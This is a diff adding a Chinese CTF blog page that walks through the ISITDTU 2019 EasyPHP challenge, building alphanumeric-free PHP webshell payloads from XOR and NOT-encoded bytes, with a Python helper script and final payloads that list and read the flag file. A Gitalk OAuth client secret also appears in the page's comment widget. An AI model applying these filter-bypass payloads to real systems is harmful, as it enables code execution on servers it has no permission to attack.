@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>[ISITDTU 2019]EasyPHP(无数字字母Webshell进阶) |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="[ISITDTU 2019]EasyPHP(无数字字母Webshell进阶) |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="[ISITDTU 2019]EasyPHP(无数字字母Webshell进阶)"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/vj4GJHsC-/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>[ISITDTU 2019]EasyPHP(无数字字母Webshell进阶)</h1>
+            <span class="meta">
+            	Posted on
+              2020-01-06，5 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>过滤了大部分的函数以及[\x00-\x20][0-9]&quot;$&amp;.,|[{_defgops以及\x7f<br>
+并且。输出的字符串中。最多13种不同的字符。比如。%ff%73就算两个字符</p>
+<!-- more -->
+<p><img src="https://guokeya.github.io/post-images/1578310762539.png" alt="" loading="lazy"><br>
+对于bypass。一般就是<br>
+1.函数构造字符<br>
+2.异或取反无数字webshell</p>
+<pre><code>由于这里不能输入字符。那么就无法通过函数构造getshell
+OK。这里刚好也没过滤^。大致思路出来了。通过^构造print_r(scandir('.'))
+由于这边过滤了[]{}。只能通过getallheaders。但是后面构造起来会发现。太长太麻烦了。不如直接scandir来的方便
+</code></pre>
+<p>开始构造个phpinfo，其实~P=P^0xFF<br>
+<img src="https://guokeya.github.io/post-images/1578311378725.png" alt="" loading="lazy"><br>
+当我们照这个思路构造print_r(scandir('./'))的时候，不同字符串超过了13。<br>
+<img src="https://guokeya.github.io/post-images/1578311682636.png" alt="" loading="lazy"><br>
+下一步就是缩减字符串<br>
+这个给一个思路<br>
+在构造函数中。必须用到();^，也就是4个字符。最多留给我们9个字符构造函数<br>
+我们要用9个字符。构造printscandir.的任意字符<br>
+由于单次异或所得的结果有限。那么我们是不是就能通过多次异或。将部分%xx省略</p>
+<pre><code>%8F%8D%96%91%8B%A0%8D^%FF%FF%FF%FF%FF%FF%FF
+//print
+%9B^%8F^%8F^%FF
+//p
+同理。我们可以通过几个相同的%XX。在三次异或构造字符
+</code></pre>
+<p>脚本如下(复制粘贴)：</p>
+<pre><code>result2 = [0x8b, 0x9b, 0xa0, 0x9c, 0x8f, 0x91, 0x9e, 0xd1, 0x96, 0x8d, 0x8c]  
+#这一行就是我们总共的字符串。比如print_rscandir。将重复的字符串去掉。就是所有要用到的字符串
+result = [0x9b, 0xa0, 0x9c, 0x8f, 0x9e, 0xd1, 0x96, 0x8c] 
+#一开始，result数组和result2是相同的。当我们减去末尾0x8c的时候。
+#看程序返回的temp长度对不对。如果对。那么就说明这个字符没必要。可以由其他字符异或替代
+#如果长度不对。那么就恢复。继续尝试删其他的字符
+temp = []
+for d in result2:
+    for a in result:
+        for b in result:
+            for c in result:
+                if (a ^ b ^ c == d):
+                    if a == b == c == d:
+                        continue
+                    else:
+                        print(&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot; % (a, b, c, d))
+                        if d not in temp:
+                            temp.append(d)
+print(len(temp), temp)
+</code></pre>
+<p>开始构造</p>
+<pre><code>%8F%8D%96%91%8B%A0%8D                                           
+urlencode(~print_r)
+</code></pre>
+<p>执行python脚本|grep 0x8f得到异或的字符<br>
+<img src="https://guokeya.github.io/post-images/1578312988324.png" alt="" loading="lazy"></p>
+<pre><code>a=0x9b,b=0x8f,c=0x8f,d=0x9b
+%9b^%8f^%8f^%ff            
+print_r的第一个字符就出来了
+继续执行                         
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1578313044441.png" alt="" loading="lazy"></figure>
+<pre><code>%9b%9c^%8f%8f^%8f%9e^%ff%ff
+print_r的前两个字符就出来了
+如此循环,最后就能得到print_r的值。由于scandir的字符。在脚本中也算进去了。
+同理。也可以构造出scandir的字符
+最后得到
+(%9b%9c%9b%9b%9b%9b%9c^%9b%8f%9b%9c%9c%9b%8f^%8f%9e%96%96%8c%a0%9e^%ff%ff%ff%ff%ff%ff%ff)((%9b%9b%9b%9b%9b%9b%9c^%9b%9b%9b%9c%a0%9b%8f^%8c%9c%9e%96%a0%96%9e^%ff%ff%ff%ff%ff%ff%ff)((%d1^%ff)));
+</code></pre>
+<p>找到了flag。并且在数组末尾。那么构造readfile(end(scandir('.'))就好了<br>
+计算所有需要用到的字符串readfilensc.<br>
+放入上面用过的数组中。同理。删一次看数组长度有没有变化。变化就恢复。删其他的。数组中需要字符^%ff的值<br>
+<img src="https://guokeya.github.io/post-images/1578313592544.png" alt="" loading="lazy"></p>
+<pre><code>result2 = [0x8d,0x9a,0x9e,0x9b,0x99,0x96,0x93,0x9a,0x8c,0x9c,0x91,0xd1]  # Original chars,11 total
+result = [0x8d,0x9a,0x9e,0x9b,0x99,0x96,0xd1]  # to be deleted
+temp = []
+for d in result2:
+    for a in result:
+        for b in result:
+            for c in result:
+                if (a ^ b ^ c == d):
+                    if a == b == c == d:
+                        continue
+                    else:
+                        print(&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot; % (a, b, c, d))
+                        if d not in temp:
+                            temp.append(d)
+print(len(temp), temp)
+</code></pre>
+<p>由于最后构造出来的字符串比较长。容易搞混。<br>
+首先纪录每个字符的构造<br>
+<code>为了方便。。直接去别人博客上复制粘贴了下</code></p>
+<pre><code class="language-(%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0^%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a^%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0^%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff)">//show_source
+(%a0%97%8^%9a%9a%9b^%a0%9c%8d^%ff%ff%ff)
+//end(%8d%a0%88%97%8d%9b%9c^%9a%9c%8d%9a%9b%9a%8d^%9b%a0%9b%9c%8d%97%9c^%ff%ff%ff%ff%ff%ff%ff)
+//scandir
+(%d1^%ff)
+//.
+</code></pre>
+<p>然后将上面带括号为一个整体。带入payload<br>
+show_source(end(scandir(.)))<br>
+xxx(xxx(xxx(.)))<br>
+复制粘贴就行。不用考虑格式报错<br>
+<img src="https://guokeya.github.io/post-images/1578313913278.png" alt="" loading="lazy"><br>
+<strong>更多骚操作</strong><br>
+bool转数字配合chr.拼接</p>
+<pre><code>var_dump(!a)
+//False=0
+var_dump(!!a)
+//True=1
+var_dump(!!a+!!a)
+//1+1=2
+然后利用**+-组合成ascii码
+chr( (!!a+!!a)**(!!a+!!a+!!a+!!a+!!a+!!a+!!a) -(!!a+!!a)**(!!a+!!a+!!a+!!a)) 
+chr(      2       **         7              -2         **          4)
+chr(128-12)
+chr(112)=p
+(chr(xxxxxx).chr(xxxxxx))()
+phpinfo()
+</code></pre>
+<p>dalao博客:<br>
+https://tiaonmmn.github.io/2019/07/18/ISITDTU-Easy-PHP/</p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/njWohancx/">
+              <span class="post-title">
+                FBCTF 2019 RCEService(pcre_match回溯)&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br ><!--test--></a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
